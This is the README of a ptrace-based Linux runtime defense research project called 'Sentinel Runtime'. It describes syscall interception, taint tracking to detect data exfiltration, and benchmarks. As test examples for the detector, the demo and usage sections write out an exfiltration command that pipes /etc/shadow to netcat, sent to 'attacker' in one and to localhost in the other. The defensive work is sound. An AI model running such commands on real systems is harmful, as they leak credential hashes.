# Sentinel Runtime: Host-Based Active Defense

![Milestone](https://img.shields.io/badge/milestone-M3.2_Benchmark_Suite-blueviolet?style=flat-square&logo=linux)
![Architecture](https://img.shields.io/badge/architecture-research_modular-orange?style=flat-square)
![Focus](https://img.shields.io/badge/focus-systems_security_research-363636?style=flat-square)

> **Status:** Research Artifact (Active)
> **Current Capability:** M3.2 (Exfiltration Detection + Benchmarks)
> **Target:** CISPA / Saarland MSc Application
>
> 📊 **[Read the Project Evaluation](PROJECT_EVALUATION.md)** - A comprehensive technical assessment of this research artifact's achievements, innovations, and impact for aspiring system security researchers.

## Abstract

**Sentinel Runtime** is a Linux runtime defense system designed to investigate syscall-level observability and semantic enforcement.

Unlike traditional signature-based AVs, Sentinel leverages `ptrace` to establish a closed-loop runtime control system. It connects a high-speed C interception kernel to a Python-based **Cognitive Engine** that classifies behavior in real-time. The system now includes **cross-process taint tracking** to detect data exfiltration attacks.

**System Security Research Dossier:** [nevinshine.github.io/system-security-research-dossier](https://nevinshine.github.io/runtime-security-dossier/)

---

## M3.1: Data Exfiltration Detection (NEW)

Demonstration of **Sentinel Runtime** blocking a cross-process data exfiltration attack.

### Attack Blocked: `cat /etc/shadow | nc attacker 4444`

```
ALLOW      | 38683    | openat     | SENSITIVE_FILE_OPENED  | CRITICAL_AUTH      | /etc/shadow
ALLOW      | 38683    | read       | SENSITIVE_DATA_HELD    | N/A                | 3
ALLOW      | 38683    | write      | SENSITIVE_DATA_HELD    | N/A                | 1   ← Data enters pipe
...
ALLOW      | 38684    | socket     | IDLE                   | N/A                | 2
ALLOW      | 38684    | connect    | IDLE                   | N/A                | 3
ALLOW      | 38684    | read       | SENSITIVE_DATA_HELD    | N/A                | 0   ← Tainted via pipe
BLOCK      | 38684    | write      | EXFILTRATION_ATTEMPT   | N/A                | 3   ← BLOCKED!
  └── ⚠️  EXFILTRATION ATTEMPT BLOCKED! Sensitive data was about to leave via network.
```

**Key Innovation:** Cross-process taint tracking detects when sensitive data flows through pipes to network sockets, even across different processes.

---

## Capability Milestone Status

| Feature | Milestone | Status | Description |
| :--- | :--- | :--- | :--- |
| **Deep Introspection** | M0.8 | ✅ COMPLETE | Argument extraction via `PTRACE_PEEKDATA`. |
| **Online Inference Loop** | M1.0 | ✅ COMPLETE | Real-time decision pipeline via Named Pipes (IPC). |
| **Recursive Process Tracking** | M2.0 | ✅ COMPLETE | Tracing dynamic trees via `PTRACE_O_TRACEFORK`. |
| **Universal Extraction** | M2.1 | ✅ COMPLETE | Map-based extraction for `unlink`, `openat`, `execve`. |
| **Active Blocking** | M2.1 | ✅ COMPLETE | Injecting `EPERM` verdicts to prevent execution. |
| **Semantic Understanding** | M3.0 | ✅ COMPLETE | Translating paths to concepts (e.g., `CRITICAL_AUTH`). |
| **Exfiltration Detection** | M3.1 | ✅ COMPLETE | **State Machine + Cross-Process Taint Tracking.** |
| **Benchmark Suite** | M3.2 | ✅ COMPLETE | **Performance measurement and documentation.** |

---

## Performance Benchmarks (M3.2)

| Metric | Value |
|--------|-------|
| **Syscall Overhead** | 20-40x (ptrace-based) |
| **IPC Throughput** | 28,628 ops/sec |
| **Memory Usage** | ~100 MB total |

| Syscall | Native | Traced | Overhead |
|---------|--------|--------|----------|
| open()+close() | 15 µs | 342 µs | 22.8x |
| read() 4KB | 3 µs | 115 µs | 37.2x |
| write() 4KB | 6 µs | 120 µs | 20.6x |

See [`benchmarks/BENCHMARKS.md`](benchmarks/BENCHMARKS.md) for full methodology and analysis.

---

## Research Roadmap

* **M1.0: The Closed Loop** ✅
    * Connected C Engine to Python Brain via IPC Pipes.
    * Established the ALLOW/BLOCK decision protocol.
* **M2.0: Recursive Vision** ✅
    * Implemented `PTRACE_O_TRACEFORK` to track process trees.
* **M2.1: Universal Defense** ✅
    * Added `PTRACE_O_TRACEVFORK` for optimized shells.
    * Validated "Kill Switch" for file deletion attempts.
* **M3.0: Semantic Understanding** ✅
    * Implemented `SemanticMapper` with regex taxonomy.
    * Behavioral Policy: Concept-based detection.
* **M3.1: Exfiltration Detection** ✅ (NEW)
    * **State Machine:** Detects Open → Read → Socket Write kill chain.
    * **Taint Tracking:** Cross-process pipe attack detection.
* **M3.2: Benchmark Suite** ✅ (NEW)
    * Quantified syscall overhead, IPC throughput, memory usage.
* **M4.0: MITRE ATT&CK Mapping** (Next)
    * Document detected techniques against ATT&CK framework.

---

## Architecture

Sentinel operates as a modular closed-loop runtime control system:

### 1. Systems Layer (C / Kernel Space)
*Located in `src/engine/`*
- **Interception Engine (`main.c`):** Recursive `ptrace` monitor with syscall entry/exit tracking.
- **Universal Map (`syscall_map.h`):** Syscall signatures for file, network, and process operations.
- **Visualization (`logger.c`):** Real-time process tree rendering.

### 2. Analysis Layer (Python / Data Space)
*Located in `src/analysis/`*
- **Neural Engine (`brain.py`):** Decision center with state machine integration.
- **Semantic Mapper (`semantic.py`):** Knowledge base for path → concept classification.
- **State Machine (`state_machine.py`):** **[NEW]** Exfiltration detection with taint tracking.

### 3. Benchmarks
*Located in `benchmarks/`*
- **`syscall_latency.py`:** Measure per-syscall overhead.
- **`ipc_throughput.py`:** Quantify IPC performance.
- **`memory_profile.py`:** Track RAM usage.
- **`workloads/`:** Stress test scripts.

---

## Usage

### 1. Build
```bash
make clean && make
```

### 2. Run (Two Terminals)

**Terminal 1 (Brain):**
```bash
cd src/analysis
python3 brain.py
```

**Terminal 2 (Sentinel):**
```bash
sudo ./bin/sentinel test /bin/bash
```

### 3. Test Exfiltration Detection
```bash
# Inside monitored shell:
cat /etc/shadow | nc localhost 4444
# Result: BLOCKED!
```

### 4. Run Benchmarks
```bash
# Native baseline
python3 benchmarks/syscall_latency.py native

# IPC throughput
python3 benchmarks/ipc_throughput.py

# Memory profile (while Sentinel is running)
python3 benchmarks/memory_profile.py 60
```

---

## Tags

| Tag | Milestone | Description |
|-----|-----------|-------------|
| M2.0 | Universal Eyes | ptrace engine |
| M2.1 | VFORK Support | Shell compatibility |
| M3.0 | Semantic Engine | Concept classification |
| M3.1 | State Machine | Exfiltration detection |
| M3.2 | Benchmarks | Performance measurement |

---

*Research Author: Nevin Shine.*